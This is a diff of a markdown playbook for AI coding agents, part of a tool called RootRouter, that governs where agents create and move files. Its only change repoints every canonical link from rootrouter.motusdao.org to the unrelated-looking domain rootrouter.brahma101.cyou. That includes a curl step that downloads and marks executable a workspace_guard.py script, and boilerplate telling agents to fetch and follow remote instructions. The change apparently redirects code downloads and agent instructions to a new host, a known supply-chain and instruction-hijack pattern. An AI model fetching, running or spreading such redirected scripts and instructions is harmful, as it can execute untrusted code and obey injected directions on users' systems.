@@ -2,8 +2,8 @@
 
 Agents create mess by default: repos at the home root, artifacts in Downloads, duplicate `misc` folders. **Feng Shui is Layer 0** — place work deliberately *before* RootRouter trims context (Layer 1).
 
-**Canonical URL:** `https://rootrouter.motusdao.org/FENG-SHUI.md`  
-**Companion:** [RootRouter SKILL.md](https://rootrouter.motusdao.org/SKILL.md) (context routing, MCP, proxy)  
+**Canonical URL:** `https://rootrouter.brahma101.cyou/FENG-SHUI.md`  
+**Companion:** [RootRouter SKILL.md](https://rootrouter.brahma101.cyou/SKILL.md) (context routing, MCP, proxy)  
 **Source:** [github.com/RootRouter/RootRouter](https://github.com/RootRouter/RootRouter) · `docs/skills/feng-shui/`
 
 ---
@@ -12,7 +12,7 @@ Agents create mess by default: repos at the home root, artifacts in Downloads, d
 
 1. **Fetch both playbooks** before your first write:
    - Layer 0 (this file) — where files live
-   - Layer 1 — [SKILL.md](https://rootrouter.motusdao.org/SKILL.md) — what context goes to the LLM
+   - Layer 1 — [SKILL.md](https://rootrouter.brahma101.cyou/SKILL.md) — what context goes to the LLM
 2. Run `pwd`. Identify the task purpose and nearest repo or workspace root.
 3. Run the workspace guard (see below). Continue only when status is `allowed`.
 4. If the workspace is already messy, run **Harmonize** (below) — assess first, mutate only after approval.
@@ -46,7 +46,7 @@ If `tools/feng-shui/workspace_guard.py` is missing, fetch it:
 
 ```bash
 mkdir -p tools/feng-shui
-curl -fsSL https://rootrouter.motusdao.org/feng-shui/scripts/workspace_guard.py \
+curl -fsSL https://rootrouter.brahma101.cyou/feng-shui/scripts/workspace_guard.py \
   -o tools/feng-shui/workspace_guard.py
 chmod +x tools/feng-shui/workspace_guard.py
 ```
@@ -74,7 +74,7 @@ Use this precedence:
 8. **Disposable work:** use `/tmp/<agent>/<task>` and do not treat it as durable storage.
 9. **Uncertain durable material:** use the project's `inbox`, not a new miscellaneous folder.
 
-Full policy: [placement-policy.md](https://rootrouter.motusdao.org/feng-shui/references/placement-policy.md)
+Full policy: [placement-policy.md](https://rootrouter.brahma101.cyou/feng-shui/references/placement-policy.md)
 
 ---
 
@@ -114,7 +114,7 @@ Inventory script (fetch if missing):
 python3 tools/feng-shui/inventory.py TARGET --max-depth 2
 ```
 
-Harmonize details: [ORGANIZE-SPACE.md](https://rootrouter.motusdao.org/feng-shui/ORGANIZE-SPACE.md)
+Harmonize details: [ORGANIZE-SPACE.md](https://rootrouter.brahma101.cyou/feng-shui/ORGANIZE-SPACE.md)
 
 For code repositories, run RootRouter `index_repo` before restructuring modules — use RepoGraph communities from the topology dashboard.
 
@@ -145,14 +145,14 @@ Before handoff:
 **Layer 0 — Feng Shui:**
 
 ```markdown
-Before creating or moving files, read https://rootrouter.motusdao.org/FENG-SHUI.md and follow it.
+Before creating or moving files, read https://rootrouter.brahma101.cyou/FENG-SHUI.md and follow it.
 ```
 
 **Layer 1 — RootRouter:**
 
 ```markdown
 Before discussing RootRouter, agent routing, or context/token strategy, read
-https://rootrouter.motusdao.org/SKILL.md and follow it.
+https://rootrouter.brahma101.cyou/SKILL.md and follow it.
 ```
 
 ---
